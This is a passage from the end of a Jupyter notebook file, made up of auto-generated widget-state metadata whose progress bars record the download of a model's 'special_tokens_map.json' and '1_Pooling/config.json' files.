            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "1a430ea553524d17839d43443da1af15": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "aa3927bda22f4234a172b593f9de44b7": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "ProgressStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "ProgressStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "bar_color": null,
            "description_width": ""
          }
        },
        "6aca4bd07f1e4c4ab60b242906a6e1ea": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "19a2d56e9c684917bea1815f71fb5155": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "f380c6fcadef43e3b2c70f52d231c829": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HBoxModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HBoxModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HBoxView",
            "box_style": "",
            "children": [
              "IPY_MODEL_e5ddb51c1e7a42a08c76b1fbc95b4d23",
              "IPY_MODEL_f0f4e602b41c49ce92f11eb335322eec",
              "IPY_MODEL_92cfe53de5fe4f64a55a6a51ad50e583"
            ],
            "layout": "IPY_MODEL_54f756b5470741d5835a20150bff57d3"
          }
        },
        "e5ddb51c1e7a42a08c76b1fbc95b4d23": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_054c6320d8104fd5a4de8081937fa3ed",
            "placeholder": "​",
            "style": "IPY_MODEL_689a1c8f00ec4edab6a8654f2c585028",
            "value": "special_tokens_map.json: 100%"
          }
        },
        "f0f4e602b41c49ce92f11eb335322eec": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "FloatProgressModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "FloatProgressModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "ProgressView",
            "bar_style": "success",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_9ef263034bcf41e9baa1bb1ad01c1c7b",
            "max": 125,
            "min": 0,
            "orientation": "horizontal",
            "style": "IPY_MODEL_28f3f70a354d4c7e9e8ce5279fd14f39",
            "value": 125
          }
        },
        "92cfe53de5fe4f64a55a6a51ad50e583": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_d61fd5da60534b29b7e99028e424a4dd",
            "placeholder": "​",
            "style": "IPY_MODEL_6b786f9cd10245e6b75da9597439cae8",
            "value": " 125/125 [00:00&lt;00:00, 6.53kB/s]"
          }
        },
        "54f756b5470741d5835a20150bff57d3": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "054c6320d8104fd5a4de8081937fa3ed": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "689a1c8f00ec4edab6a8654f2c585028": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "9ef263034bcf41e9baa1bb1ad01c1c7b": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "28f3f70a354d4c7e9e8ce5279fd14f39": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "ProgressStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "ProgressStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "bar_color": null,
            "description_width": ""
          }
        },
        "d61fd5da60534b29b7e99028e424a4dd": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "6b786f9cd10245e6b75da9597439cae8": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "3589081a351e403cb5154f2866226b97": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HBoxModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HBoxModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HBoxView",
            "box_style": "",
            "children": [
              "IPY_MODEL_6f734724a3e24d9fa0ff6e3a84599017",
              "IPY_MODEL_4e47773d6ac349f2b185aa6dbcbe7023",
              "IPY_MODEL_e7ca5589bd9940718ee1b76164227e82"
            ],
            "layout": "IPY_MODEL_7a9b6591bf054bd08889fc8ad2c78e3b"
          }
        },
        "6f734724a3e24d9fa0ff6e3a84599017": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_da8feb0d2f9243e4a6c6cc4882c631ca",
            "placeholder": "​",
            "style": "IPY_MODEL_35f5f3e81af24bc88d66dc91a2d65d7b",
            "value": "1_Pooling/config.json: 100%"
          }
        },
        "4e47773d6ac349f2b185aa6dbcbe7023": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "FloatProgressModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "FloatProgressModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "ProgressView",
            "bar_style": "success",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_aba29b09c49647b89b6b1322c9004b2f",
            "max": 190,
            "min": 0,
            "orientation": "horizontal",
            "style": "IPY_MODEL_6ee45e3313994a81842bcdd903cda872",
            "value": 190
          }
        },
        "e7ca5589bd9940718ee1b76164227e82": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_e0b62255366644d2842ccb89ef7b262f",
            "placeholder": "​",
            "style": "IPY_MODEL_a6be738ab114450d8dc75c80d1b17b7a",
            "value": " 190/190 [00:00&lt;00:00, 7.22kB/s]"
          }
        },
        "7a9b6591bf054bd08889fc8ad2c78e3b": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "da8feb0d2f9243e4a6c6cc4882c631ca": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "35f5f3e81af24bc88d66dc91a2d65d7b": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "aba29b09c49647b89b6b1322c9004b2f": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "6ee45e3313994a81842bcdd903cda872": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "ProgressStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "ProgressStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "bar_color": null,
            "description_width": ""
          }
        },
        "e0b62255366644d2842ccb89ef7b262f": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "a6be738ab114450d8dc75c80d1b17b7a": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        }
      }
    }
  },
  "nbformat": 4,
  "nbformat_minor": 0
}